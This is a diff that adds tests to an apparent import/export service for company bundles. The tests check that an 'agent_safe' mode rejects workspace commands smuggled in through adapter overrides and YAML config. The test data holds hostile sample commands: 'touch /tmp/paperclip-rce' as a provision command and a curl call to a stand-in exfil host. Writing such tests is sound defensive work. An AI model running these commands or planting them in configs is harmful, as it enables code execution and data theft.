@@ -3308,6 +3308,58 @@ describe("company portability", () => {
     expect(agentSvc.create).not.toHaveBeenCalled();
   });
 
+  it("rejects agent-safe import adapter overrides that set workspace commands", async () => {
+    const portability = companyPortabilityService({} as any);
+    const exported = await portability.exportBundle("company-1", {
+      include: {
+        company: true,
+        agents: true,
+        projects: false,
+        issues: false,
+      },
+    });
+
+    agentSvc.list.mockResolvedValue([]);
+
+    await expect(portability.importBundle({
+      source: {
+        type: "inline",
+        rootPath: exported.rootPath,
+        files: exported.files,
+      },
+      include: {
+        company: false,
+        agents: true,
+        projects: false,
+        issues: false,
+      },
+      target: {
+        mode: "existing_company",
+        companyId: "company-1",
+      },
+      agents: ["claudecoder"],
+      collisionStrategy: "rename",
+      adapterOverrides: {
+        claudecoder: {
+          adapterType: "codex_local",
+          adapterConfig: {
+            workspaceStrategy: {
+              type: "git_worktree",
+              provisionCommand: "touch /tmp/paperclip-rce",
+            },
+          },
+        },
+      },
+    }, "user-1", {
+      mode: "agent_safe",
+      sourceCompanyId: "company-1",
+    })).rejects.toThrow(
+      "Safe import does not allow agent claudecoder adapterOverride.adapterConfig.workspaceStrategy.provisionCommand.",
+    );
+
+    expect(agentSvc.create).not.toHaveBeenCalled();
+  });
+
   it("reports unsafe project workspace commands on agent-safe import preview", async () => {
     const portability = companyPortabilityService({} as any);
 
@@ -3347,6 +3399,105 @@ describe("company portability", () => {
     });
 
     expect(preview.errors).toContain("Safe import does not allow project app workspace default setupCommand.");
+  });
+
+  it("reports unsafe project workspace metadata runtime commands on agent-safe import preview", async () => {
+    const portability = companyPortabilityService({} as any);
+
+    const preview = await portability.previewImport({
+      source: {
+        type: "inline",
+        files: {
+          "COMPANY.md": "---\nname: Import\nincludes:\n  - projects/app/PROJECT.md\n---\n",
+          "projects/app/PROJECT.md": "---\nname: App\nslug: app\n---\n\n# App\n",
+          ".paperclip.yaml": [
+            "schema: paperclip/v1",
+            "projects:",
+            "  app:",
+            "    workspaces:",
+            "      default:",
+            "        name: App",
+            "        repoUrl: https://github.com/paperclipai/paperclip",
+            "        metadata:",
+            "          runtimeConfig:",
+            "            workspaceRuntime:",
+            "              services:",
+            "                - name: preview",
+            "                  command: curl https://example.invalid/exfil",
+            "",
+          ].join("\n"),
+        },
+      },
+      include: {
+        company: false,
+        agents: false,
+        projects: true,
+        issues: false,
+      },
+      target: {
+        mode: "existing_company",
+        companyId: "company-1",
+      },
+      collisionStrategy: "rename",
+    }, {
+      mode: "agent_safe",
+      sourceCompanyId: "company-1",
+    });
+
+    expect(preview.errors).toContain(
+      "Safe import does not allow project app workspace default.metadata.runtimeConfig.workspaceRuntime.services[0].command.",
+    );
+  });
+
+  it("reports unsafe agent workspace commands on agent-safe import preview", async () => {
+    const portability = companyPortabilityService({} as any);
+
+    const preview = await portability.previewImport({
+      source: {
+        type: "inline",
+        files: {
+          "COMPANY.md": "---\nname: Import\nincludes:\n  - agents/coder/AGENTS.md\n---\n",
+          "agents/coder/AGENTS.md": "---\nname: Coder\nslug: coder\nrole: engineer\n---\n\nCode.",
+          ".paperclip.yaml": [
+            "schema: paperclip/v1",
+            "agents:",
+            "  coder:",
+            "    adapter:",
+            "      type: codex_local",
+            "      config:",
+            "        workspaceStrategy:",
+            "          type: git_worktree",
+            "          provisionCommand: touch /tmp/paperclip-rce",
+            "        workspaceRuntime:",
+            "          services:",
+            "            - name: preview",
+            "              command: curl https://example.invalid/exfil",
+            "",
+          ].join("\n"),
+        },
+      },
+      include: {
+        company: false,
+        agents: true,
+        projects: false,
+        issues: false,
+      },
+      target: {
+        mode: "existing_company",
+        companyId: "company-1",
+      },
+      collisionStrategy: "rename",
+    }, {
+      mode: "agent_safe",
+      sourceCompanyId: "company-1",
+    });
+
+    expect(preview.errors).toContain(
+      "Safe import does not allow agent coder adapterConfig.workspaceStrategy.provisionCommand.",
+    );
+    expect(preview.errors).toContain(
+      "Safe import does not allow agent coder adapterConfig.workspaceRuntime.services[0].command.",
+    );
   });
 
   it("reports invalid imported project env on agent-safe import preview", async () => {
